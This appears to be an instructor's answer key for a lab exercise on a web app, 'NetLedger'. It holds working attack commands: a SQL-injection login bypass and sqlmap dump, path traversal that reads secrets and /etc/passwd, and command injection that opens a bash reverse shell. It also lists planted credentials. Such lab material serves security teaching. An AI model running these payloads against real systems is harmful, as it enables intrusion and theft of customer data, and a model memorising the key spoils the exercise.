# Solution — 09 NetLedger (medium, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` describes the API and lists the routes. `GET /health` is the DB-backed healthcheck;
`GET /api/info` returns `{"app":"NetLedger",…}`. `POST /api/login` signs an accountant in,
`GET /api/customers?q=` searches the ledger (token required), `GET /api/reports/download?file=`
serves billing reports. One route is **not** advertised: `POST /api/admin/diag`. Postgres
(`db.netledger.lab`) is on the network.

## Intended chain (A → D → J; each step unlocks the next)

### A — SQL-injection auth bypass (and data dump)

`POST /api/login` concatenates the username straight into the query
(`… WHERE username = '<u>' AND password_md5 = '<md5(p)>'`). The password is hashed, so the
username field is the injection point:

```sh
curl -s http://127.0.0.1:8509/api/login -H 'content-type: application/json' \
  -d '{"username":"admin'"'"' -- ","password":"x"}'
```

returns an **admin** token: `{"token":"<hex>","username":"admin","role":"admin"}`.
`' OR '1'='1' -- ` works too. With the token, the ledger search is **also** injectable (the
`q` term is concatenated into a `WHERE … ILIKE '%<q>%'`), so it is UNION-/boolean-dumpable:

```sh
TOKEN=$(curl -s http://127.0.0.1:8509/api/login -H 'content-type: application/json' \
  -d '{"username":"admin'"'"' -- ","password":"x"}' | sed 's/.*"token":"\([a-f0-9]*\)".*/\1/')

curl -s "http://127.0.0.1:8509/api/customers?q=" -H "Authorization: Bearer $TOKEN"   # all rows
sqlmap -u "http://127.0.0.1:8509/api/customers?q=a" \
  -H "Authorization: Bearer $TOKEN" -p q --dump -T customers --batch
```

The ledger is the reportable **customer PII** (e.g. `a.delacroix@pont-neuf-capital.example`,
card last-4, balances).

### D — path-traversal secrets exfiltration

`GET /api/reports/download?file=` does `Path.Combine("/app/reports", <file>)` with no
containment check and returns the bytes. A legit call is
`?file=statement-2024-q3.txt`; climbing out leaks the app's secrets file and arbitrary host
files:

```sh
curl -s "http://127.0.0.1:8509/api/reports/download?file=../appsettings.Secrets.json"
curl -s "http://127.0.0.1:8509/api/reports/download?file=../../../../etc/passwd"
```

`appsettings.Secrets.json` leaks the Postgres connection string
(`netledger / netledger-db-pw-2024`), an API key (`nl_live_sk_7Qb3xZ9fK2mWpR4t`), SMTP
creds, and the **admin diagnostics token** `AdminToken = ndl-diag-7f3c9a21`.

### J — admin diagnostics → command injection → RCE/revshell

`POST /api/admin/diag` is unlinked but guessable. It is gated by the `X-Admin-Token` header
(recovered in step D) and runs `ping -c 1 <target>` via `/bin/sh -c` with the target
interpolated unescaped — a classic command injection:

```sh
# prove execution
curl -s http://127.0.0.1:8509/api/admin/diag \
  -H 'content-type: application/json' -H 'X-Admin-Token: ndl-diag-7f3c9a21' \
  -d '{"target":"127.0.0.1; id"}'
#  -> ping output, then: uid=0(root) gid=0(root) ...

# reverse shell (listener first: `nc -lvnp 4444` on the attacker box)
curl -s http://127.0.0.1:8509/api/admin/diag \
  -H 'content-type: application/json' -H 'X-Admin-Token: ndl-diag-7f3c9a21' \
  -d '{"target":"x; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}'
```

The injected command runs whether or not `ping` resolves the target, so execution is
reliable. The container runs the app as root, so this is immediate root RCE on the app host.

## Alternate / supporting

- The connection string from step D lets you talk to Postgres directly on the network
  (`10.20.9.10:5432`) for the same PII dump without the SQLi.
- `GET /api/info` and verbose `query failed` error bodies on the login/search endpoints
  confirm the ASP.NET Core / Npgsql backend and aid blind-SQLi tuning.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `customer-pii` | `a.delacroix@pont-neuf-capital.example`, … | Postgres `customers` (SQLi or psql) |
| `leaked-secrets-file` | `nl_live_sk_7Qb3xZ9fK2mWpR4t` + admin token + conn string | `GET …/reports/download?file=../appsettings.Secrets.json` → `/app/appsettings.Secrets.json` |
| `app-banner` | `NetLedger` | `GET http://127.0.0.1:8509/` |

Users: `admin:Sup3r-L3dger-2024` (admin), `a.ferran:autumn2024`, `t.osei:Passw0rd!`
(accountants). Login is SQLi-bypassable regardless of password.

## Reset

`make lab-restore LAB=09-medium-dotnet` (recreate — drops the Postgres volume and re-seeds).
